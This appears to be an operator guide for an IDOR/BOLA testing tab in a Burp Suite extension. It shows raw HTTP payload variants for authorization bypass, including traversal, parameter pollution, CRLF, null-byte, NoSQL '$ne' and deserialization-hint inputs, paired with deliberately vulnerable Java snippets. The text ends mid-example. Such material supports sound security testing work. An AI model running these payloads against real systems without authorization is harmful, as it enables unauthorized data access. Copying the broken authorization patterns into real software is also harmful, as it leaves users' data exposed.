# IDOR / BOLA Playbooks

The `IDOR` tab is for object-identifier manipulation and broken object-level authorization testing.

Generation lives in `core/src/main/java/com/bypassfuzzer/core/scan/IdorPlanner.java` and `ResponseGuidedIdorPlanner.java`; the Burp engine is an adapter over these shared planners.

The examples below explain techniques. The selected identifier slot and enabled families determine the emitted plan. Families marked DANGEROUS are opt-in. Preview the actual request set before running it. Baseline gating, response-guided probes and execution behavior are described in [the shared engine guide](https://github.com/intrudir/BypassFuzzer-Burp/blob/main/docs/SCAN-ENGINE.md).

This page is meant to read like an operator guide, not just a registry dump. It shows why the tab exists, how the flow works, and what the raw requests look like when we mutate an identifier.

## Table of Contents

- [Why This Is In The Tool](#why-this-is-in-the-tool)
- [Core Flow](#core-flow)
- [Context-Aware Model](#context-aware-model)
- [Naming Scheme](#naming-scheme)
- [Technique Examples](#technique-examples)
  - [`idor.path.suffix_formats`](#idorpathsuffix_formats)
  - [`idor.path.trailing_slash`](#idorpathtrailing_slash)
  - [`idor.path.special_identifier_values`](#idorpathspecial_identifier_values)
  - [`idor.path.dot_segments`](#idorpathdot_segments)
  - [`idor.query.conflicting_identifiers`](#idorqueryconflicting_identifiers)
  - [`idor.hybrid.cross_source_conflicts`](#idorhybridcross_source_conflicts)
  - [`idor.query.parameter_pollution`](#idorqueryparameter_pollution)
  - [`idor.query.comma_separated_identifiers`](#idorquerycomma_separated_identifiers)
  - [`idor.query.json_wrap`](#idorqueryjson_wrap)
  - [`idor.query.identifier_aliases`](#idorqueryidentifier_aliases)
  - [`idor.query.numeric_pivots`](#idorquerynumeric_pivots)
  - [`idor.body.content_type_tampering`](#idorbodycontent_type_tampering)
  - [`idor.body.json_batch_identifiers`](#idorbodyjson_batch_identifiers)
  - [`idor.hybrid.accept_negotiation`](#idorhybridaccept_negotiation)
  - [`idor.body.json_wrap`](#idorbodyjson_wrap)
  - [`idor.body.deserialization_hints`](#idorbodydeserialization_hints)
  - [`idor.body.json_parameter_pollution`](#idorbodyjson_parameter_pollution)
  - [`idor.body.wildcard_identifiers`](#idorbodywildcard_identifiers)
  - [`idor.body.unexpected_data_types`](#idorbodyunexpected_data_types)
  - [`idor.hybrid.trailing_control_characters`](#idorhybridtrailing_control_characters)
  - [`idor.hybrid.empty_identifier_values`](#idorhybridempty_identifier_values)
  - [`idor.hybrid.resource_shortcuts`](#idorhybridresource_shortcuts)
  - [`idor.hybrid.case_variants`](#idorhybridcase_variants)
  - [`idor.hybrid.canonical_identifier_formats`](#idorhybridcanonical_identifier_formats)
  - [`idor.hybrid.uuid_neighbor_edits`](#idorhybriduuid_neighbor_edits)
  - [`idor.hybrid.truncated_identifier_variants`](#idorhybridtruncated_identifier_variants)
  - [`idor.hybrid.uuid_version_variants`](#idorhybriduuid_version_variants)
  - [`idor.hybrid.identifier_encoding`](#idorhybrididentifier_encoding)
  - [`idor.hybrid.query_body_cross_source`](#idorhybridquery_body_cross_source)
  - [`idor.hybrid.method_override`](#idorhybridmethod_override)
  - [`idor.body.json_edge_cases`](#idorbodyjson_edge_cases)

## Why This Is In The Tool

An IDOR/BOLA workflow is different from a generic AuthZ bypass workflow.

The tester usually has:

- one identifier they are allowed to access
- one identifier they are not allowed to access

The job of the tab is to:

1. establish a control request with the authorized identifier
2. establish a denied baseline with the target identifier
3. discover where the authorized identifier appears in the request
4. run named object-manipulation playbooks against those discovered identifier locations

This lets the results answer a more specific question:

"What request mutations make identifier 2 behave more like identifier 1?"

## Core Flow

The IDOR workflow is:

1. send the original request as the control request
2. replace identifier 1 with identifier 2 and send that as the target baseline
3. analyze where identifier 1 appeared in the original request
4. generate and send playbook variants derived from those identifier locations in the identifier-2 request

In code, that flow lives in `src/main/java/com/bypassfuzzer/burp/core/idor/IdorEngine.java`.

## Context-Aware Model

The IDOR tab is context-aware.

That means the playbooks should not assume the identifier only lives in the path.

Examples:

- if identifier 1 appears in the path, path-oriented playbooks mutate the path
- if identifier 1 appears in the query string, query-oriented playbooks use that query context
- if identifier 1 appears in a JSON body such as `{"id":111}`, body-oriented playbooks mutate that JSON field in place

## Naming Scheme

- `idor.path.*`
  Path and route-shape manipulation around the target identifier.
- `idor.query.*`
  Query-string conflicts and duplicate identifier source tests.
- `idor.body.*`
  Body-based identifier placement and content-type parser tests.
- `idor.hybrid.*`
  Curated ideas borrowed from the bypass tab when they are also useful for IDOR.

## Technique Examples

### `idor.path.suffix_formats`

Display name:
`Suffix Formats`

### Purpose

This playbook exists because some routes, rewrite rules, middleware, and object binders treat file-like values differently from plain object identifiers. That can matter both in paths and in discovered identifier fields inside request bodies.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

Starting point:

```http
GET /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

Representative variants:

```http
GET /something/def456.json HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456.html HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"def456.json"}
```

### What The Broken Target Code Might Look Like

```java
if (request.path().equals("/something/" + id)) {
    requireOwnership(user, id);
}

return fileStyleRouter.dispatch(request.path());
```

### `idor.path.trailing_slash`

Display name:
`Trailing Slash`

### Purpose

This playbook exists because authorization and routing layers often disagree about whether the terminal slash matters.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/def456/ HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if (request.path().equals("/something/" + id)) {
    requireOwnership(user, id);
}

return router.dispatch(stripTrailingSlash(request.path()));
```

### `idor.path.special_identifier_values`

Display name:
`Special Identifier Values`

### Purpose

This playbook exists because some applications have sentinel handling for values like `0`, `1`, `-1`, or unusual encoded characters. That logic can show up in route handling and in request-body object resolution.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/0 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/1 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/-1 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/%C3%87 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"-1"}
```

### What The Broken Target Code Might Look Like

```java
if ("0".equals(id) || "-1".equals(id)) {
    return recordRepository.findDefaultRecord();
}
```

```java
String suppliedId = request.json().get("id").asText();
if ("0".equals(suppliedId) || "-1".equals(suppliedId)) {
    return objectService.loadDefaultRecord();
}
```

### `idor.path.dot_segments`

Display name:
`Dot Segment Traversal`

### Purpose

This playbook exists because some systems normalize dot segments differently across routing, authorization, and object binding. The same trick can matter in path segments and in identifier values carried in request bodies.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/abc123/../def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/abc123/%2E%2E/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/abc123%2F..%2Fdef456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"abc123/../def456"}
```

### What The Broken Target Code Might Look Like

```java
if (request.path().contains("/" + currentUserId + "/")) {
    allow();
}

return router.dispatch(normalizePath(request.path()));
```

```java
String candidateId = request.json().get("id").asText();
return objectService.load(normalizeIdentifier(candidateId));
```

### `idor.query.conflicting_identifiers`

Display name:
`Conflicting Query Identifiers`

### Purpose

This playbook exists because some applications resolve the object from the path, some from the query string, and some take the first or last matching identifier source.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/def456?id=abc123 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?accountId=abc123 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?accountId=abc123&id=def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
String effectiveId = request.queryParam("accountId");
if (effectiveId == null) {
    effectiveId = request.pathParam("id");
}

return accountService.fetchForUser(user, effectiveId);
```

### `idor.hybrid.cross_source_conflicts`

Display name:
`Cross-Source Conflicts`

### Purpose

This playbook exists because some applications can resolve the object from both the path and the query string, but they do not agree on which source wins.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

Starting point:

```http
GET /something/accounts/abc123 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

Representative conflict matrix:

```http
GET /something/accounts/abc123?id=abc123 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/accounts/def456?id=abc123 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/accounts/abc123?id=def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/accounts/def456?id=def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
String effectiveId = request.queryParam("id");
if (effectiveId == null) {
    effectiveId = request.pathParam("id");
}

return objectService.loadForUser(user, effectiveId);
```

This is different from `idor.query.conflicting_identifiers`:

- `idor.query.conflicting_identifiers`
  keeps the main request shape and layers conflicting query parameters onto it
- `idor.hybrid.cross_source_conflicts`
  is specifically for requests where the identifier can be carried in both the path and the query string, and it tests which source the application actually trusts

### `idor.query.parameter_pollution`

Display name:
`Parameter Pollution`

### Purpose

This playbook exists because some applications take the first matching identifier, some take the last, and some merge duplicate parameters in surprising ways.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/def456?id=def456&id=def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id=abc123&id=def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id=def456&id=abc123 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
String effectiveId = request.queryParams("id").get(0);
return objectService.loadForUser(user, effectiveId);
```

### `idor.query.comma_separated_identifiers`

Display name:
`Comma-Separated Identifiers`

### Purpose

This playbook exists because some APIs accept list-style query parameters such as `id=1,2,3` and then iterate, split, or partially validate them. Mixing authorized and target IDs inside one comma-separated value can expose “any-match” or first-item-only behavior.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/def456?id=def456,abc123 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id=abc123,def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
String ids = request.queryParam("id");
for (String id : ids.split(",")) {
    if (userOwns(user, id)) {
        return objectService.load(id);
    }
}

throw forbidden();
```

### `idor.query.json_wrap`

Display name:
`Query JSON Wrap`

### Purpose

This playbook exists because some APIs accept query values that later get parsed as JSON or bound into objects. Wrapping the ID in a small JSON object can push the request into a different parser or binding path.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/def456?user_id={"id":9} HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?user_id={"user_id":9} HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
String raw = request.queryParam("user_id");
if (raw != null && raw.startsWith("{")) {
    JsonNode node = objectMapper.readTree(raw);
    return objectService.load(node.path("id").asText());
}

return objectService.load(raw);
```

### `idor.query.identifier_aliases`

Display name:
`Identifier Aliases`

### Purpose

This playbook exists because the object identifier is not always called `id`. Some applications use names like `userId`, `accountId`, `profileId`, `objectId`, or even domain-specific fields.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/def456?id=def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?userId=def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?accountId=def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?username=def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
String effectiveId = firstNonNull(
    request.queryParam("accountId"),
    request.queryParam("userId"),
    request.queryParam("id")
);

return accountService.fetchForUser(user, effectiveId);
```

### `idor.query.numeric_pivots`

Display name:
`Numeric Pivots`

### Purpose

This playbook exists because some applications expose an opaque identifier in the UI but still accept a simpler numeric identifier through a different parameter path.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/def456?id=0 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id=1 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id=2 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id=-1 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
String effectiveId = request.queryParam("id");
if (effectiveId == null) {
    effectiveId = lookupNumericIdFromOpaqueToken(request.pathParam("id"));
}

return objectService.load(effectiveId);
```

### `idor.body.content_type_tampering`

Display name:
`Content-Type Tampering`

### Purpose

This playbook exists because some applications resolve the object identifier from a body parser path that behaves differently depending on whether the request is form data, JSON, XML, or multipart. It also covers header/body mismatches where the declared `Content-Type` does not match the raw body shape.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/x-www-form-urlencoded

id=def456
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"def456"}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/xml

<root><accountId>def456</accountId></root>
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/x-www-form-urlencoded

{"id":"def456"}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: multipart/form-data; boundary=xabcd0

--xabcd0
Content-Type: application/x-www-form-urlencoded
Content-Disposition: form-data; name="id"

id=def456
--xabcd0--
```

### What The Broken Target Code Might Look Like

```java
if (request.contentType().contains("application/x-www-form-urlencoded")) {
    return objectService.loadForUser(user, request.formParam("id"));
}

if (request.contentType().contains("application/json")) {
    return objectService.load(request.json().get("id").asText());
}

return objectController.handleFallbackParser(request);
```

### `idor.body.json_batch_identifiers`

Display name:
`JSON Batch Identifiers`

### Purpose

This playbook exists because some APIs accept a single identifier field as an array or batch-style list. Including both the authorized and target IDs in one JSON array can surface “contains any authorized ID” logic or mixed batch-processing bugs.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"users":["def456"]}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"users":["abc123","def456"]}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"users":["def456","abc123"]}
```

### What The Broken Target Code Might Look Like

```java
JsonNode ids = request.json().get("users");
for (JsonNode id : ids) {
    if (userOwns(user, id.asText())) {
        return objectService.loadBatch(ids);
    }
}

throw forbidden();
```

### `idor.hybrid.accept_negotiation`

Display name:
`Accept Negotiation`

### Purpose

This playbook exists because some applications authorize one representation and accidentally expose another. Changing `Accept` can route the same object request through a different serializer, controller branch, or legacy response handler.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /users/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Accept: application/json
```

```http
GET /users/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Accept: application/xml
```

```http
GET /users/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Accept: text/html
```

### What The Broken Target Code Might Look Like

```java
if (request.accepts("text/html")) {
    requireOwnership(user, request.pathParam("id"));
    return htmlController.showAccount(request.pathParam("id"));
}

return apiController.serializeAccount(request.pathParam("id"));
```

### `idor.body.json_wrap`

Display name:
`JSON Wrap`

### Purpose

This playbook exists because some servers bind nested JSON objects differently from flat scalar values, which can make wrapped identifier fields slip into a different object-resolution path.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":{"id":"def456"}}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"accountId":{"accountId":"def456"}}
```

### What The Broken Target Code Might Look Like

```java
JsonNode body = request.json();

if (body.has("id")) {
    return objectService.load(body.get("id").asText());
}

if (body.has("accountId") && body.get("accountId").isObject()) {
    return objectService.load(body.get("accountId").get("accountId").asText());
}

return objectController.handle(request);
```

### `idor.body.deserialization_hints`

Display name:
`Deserialization Hints`

### Purpose

This playbook exists because some servers deserialize untrusted JSON into richer objects than the developer intended. Type-hint fields, prototype-like wrappers, or alternate object shapes can send the target identifier through a different binder, mapper, or polymorphic deserialization path.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"user_id":{"@type":"java.lang.String","user_id":"def456"}}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"user_id":{"@class":"java.lang.String","user_id":"def456"}}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"user_id":{"__proto__":{"user_id":"def456"}}}
```

### What The Broken Target Code Might Look Like

```java
Object supplied = bodyBinder.bind(request.body());

if (supplied instanceof Map<?, ?> object && object.containsKey("@type")) {
    return polymorphicResolver.resolve(object);
}

if (supplied instanceof UserReference ref) {
    return accountService.load(ref.userId());
}

return accountService.load(String.valueOf(supplied));
```

### `idor.body.json_parameter_pollution`

Display name:
`JSON Parameter Pollution`

### Purpose

This playbook exists because some JSON parsers, binders, and downstream object mappers accept duplicate keys and then take either the first value, the last value, or whichever value survives an intermediate normalization step.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"user_id":"abc123","user_id":"def456"}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"user_id":"def456","user_id":"abc123"}
```

### What The Broken Target Code Might Look Like

```java
JsonNode body = request.json();
String checkedId = body.get("user_id").asText();
requireOwnership(user, checkedId);

Map<String, Object> bound = request.bindJsonToMap();
return objectService.load((String) bound.get("user_id"));
```

### `idor.body.wildcard_identifiers`

Display name:
`Wildcard Identifiers`

### Purpose

This playbook exists because some applications route identifier fields into `LIKE`, pattern-matching, or broad-search code paths where wildcard characters can expand the lookup scope instead of resolving one object.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"user_id":"*"}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"user_id":"%"}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"user_id":"_"}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"user_id":"."}
```

### What The Broken Target Code Might Look Like

```java
String candidate = request.json().get("user_id").asText();
return userRepository.findByPatternForTenant(user.tenantId(), candidate);
```

### `idor.body.unexpected_data_types`

Display name:
`Unexpected Data Types`

### Purpose

This playbook exists because object resolvers sometimes validate one type but deserialize another, or fall back into permissive query builders when the identifier field is not a simple string.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"username":true}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"username":null}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"username":[true]}
```

```http
POST /something/def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"username":{"$ne":"def456"}}
```

### What The Broken Target Code Might Look Like

```java
Object supplied = request.bindJsonToMap().get("username");
return objectQueryService.loadForUser(user, supplied);
```

### `idor.hybrid.trailing_control_characters`

Display name:
`Trailing Control Characters`

### Purpose

This playbook exists because some regex checks, auth gates, routers, and object resolvers trim or normalize whitespace, control characters, and null bytes differently. A value can fail one check as `def456` but still resolve as `def456%20`, `%20def456`, or `def456%00` downstream.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/def456%20 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id=def456%09 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/%20def456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456%0d%0aabc123 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456;abc123 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"def456%1f"}
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"def456%00"}
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"def456|abc123"}
```

### What The Broken Target Code Might Look Like

```java
String checkedId = request.pathParam("id");
requireOwnership(user, checkedId);

String resolvedId = normalizeForLookup(checkedId);
return objectService.load(resolvedId);
```

### `idor.hybrid.empty_identifier_values`

Display name:
`Empty Identifier Values`

### Purpose

This playbook exists because some applications treat empty, blank-ish, `null`, or `undefined` identifier values as special cases. Those values can fall into default-object, current-user, or “list all” code paths instead of a normal single-object lookup.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/ HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id= HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/null HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":null}
```

### What The Broken Target Code Might Look Like

```java
String effectiveId = request.queryParam("id");
if (effectiveId == null || effectiveId.isBlank() || "undefined".equals(effectiveId)) {
    effectiveId = currentUser.defaultObjectId();
}

return objectService.load(effectiveId);
```

### `idor.hybrid.resource_shortcuts`

Display name:
`Resource Shortcuts`

### Purpose

This playbook exists because some APIs treat semantic identifier shortcuts like `me`, `self`, or `all` as special selectors. Replacing a concrete object ID with those tokens can fall into current-user or collection-wide code paths.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/me HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/all HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id=/me HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"/all"}
```

### What The Broken Target Code Might Look Like

```java
String suppliedId = request.pathParam("id");
if ("me".equalsIgnoreCase(suppliedId) || "self".equalsIgnoreCase(suppliedId)) {
    return objectService.loadForCurrentUser(user);
}
if ("all".equalsIgnoreCase(suppliedId)) {
    return objectService.loadAllVisibleToRoute();
}

return objectService.loadById(suppliedId);
```

### `idor.hybrid.case_variants`

Display name:
`Case Variants`

### Purpose

This playbook exists because some routers, object lookups, and authorization checks treat identifier casing differently. A guard may compare one case-normalized value while the resolver uses another.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/DEF456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/def456?id=DeF456 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"dEf456"}
```

### What The Broken Target Code Might Look Like

```java
String checkedId = request.pathParam("id").toLowerCase();
requireOwnership(user, checkedId);

String resolvedId = request.queryParam("id") != null
    ? request.queryParam("id")
    : request.pathParam("id");
return objectService.load(resolvedId);
```

### `idor.hybrid.canonical_identifier_formats`

Display name:
`Canonical Identifier Formats`

### Purpose

This playbook exists because many stacks normalize UUID-like identifiers into canonical forms before one layer checks access and another resolves the object. That makes compact, braced, uppercase, and lowercase forms worth trying in the same discovered identifier location.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/550e8400e29b41d4a716446655440000 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/{550e8400-e29b-41d4-a716-446655440000} HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/550e8400-e29b-41d4-a716-446655440000?id=550E8400-E29B-41D4-A716-446655440000 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"{550e8400-e29b-41d4-a716-446655440000}"}
```

### What The Broken Target Code Might Look Like

```java
UUID checkedId = UUID.fromString(request.pathParam("id"));
requireOwnership(user, checkedId.toString());

String rawId = request.queryParam("id") != null
    ? request.queryParam("id")
    : request.pathParam("id");
return objectService.loadByRawIdentifier(rawId);
```

### `idor.hybrid.uuid_neighbor_edits`

Display name:
`UUID Neighbor Edits`

### Purpose

This playbook exists because some applications only validate a prefix, tenant shard, or early portion of an opaque identifier. Small last-byte and last-quartet edits are a cheap way to probe for sequential or pattern-based object mapping bugs.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/550e8400-e29b-41d4-a716-446655440001 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/550e8400-e29b-41d4-a716-446655440000?id=550e8400-e29b-41d4-a716-446655440001 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/550e8400-e29b-41d4-a716-44665544ffff HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"550e8400-e29b-41d4-a716-446655440001"}
```

### What The Broken Target Code Might Look Like

```java
String shardPrefix = request.pathParam("id").substring(0, 24);
requireOwnershipForShard(user, shardPrefix);

return objectRepository.findByOpaqueId(request.pathParam("id"));
```

### `idor.hybrid.truncated_identifier_variants`

Display name:
`Truncated Identifier Variants`

### Purpose

This playbook exists because some applications accept shortened IDs, pad them internally, or fall back to defaults when only a prefix, suffix, or all-zero value is supplied. That can expose partial matching and default-object behavior.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/550e8400 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/550e8400-e29b-41d4-a716-446655440000?id=55440000 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/00000000-0000-0000-0000-000000000000 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"550e8400"}
```

### What The Broken Target Code Might Look Like

```java
String suppliedId = request.pathParam("id");
String effectiveId = suppliedId.length() < 32
    ? idService.expandFromPrefix(suppliedId)
    : suppliedId;

return objectRepository.findById(effectiveId);
```

### `idor.hybrid.uuid_version_variants`

Display name:
`UUID Version Variants`

### Purpose

This playbook exists because some systems apply heuristics based on UUID version and may treat time-based, random, or namespaced IDs differently even when the rest of the identifier shape is similar.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/550e8400-e29b-11d4-a716-446655440000 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/550e8400-e29b-41d4-a716-446655440000?id=550e8400-e29b-51d4-a716-446655440000 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /something HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"id":"550e8400-e29b-11d4-a716-446655440000"}
```

### What The Broken Target Code Might Look Like

```java
UUID suppliedId = UUID.fromString(request.pathParam("id"));
if (suppliedId.version() == 1) {
    return legacyObjectService.loadForCurrentTenant(suppliedId.toString());
}

return objectService.load(suppliedId.toString());
```

### `idor.hybrid.identifier_encoding`

Display name:
`Identifier Encoding`

### Purpose

This playbook exists because the router, validator, authorization layer, and proxy stack do not always decode or normalize the identifier in the same way.

### Raw HTTP Examples

Examples below are representative. The exact emitted set is defined in the playbook implementation and may grow over time.

```http
GET /something/%64%65%66%34%35%36 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/%2564%2565%2566%2534%2535%2536 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /something/550e8400%2De29b%2D41d4%2Da716%2D446655440000 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
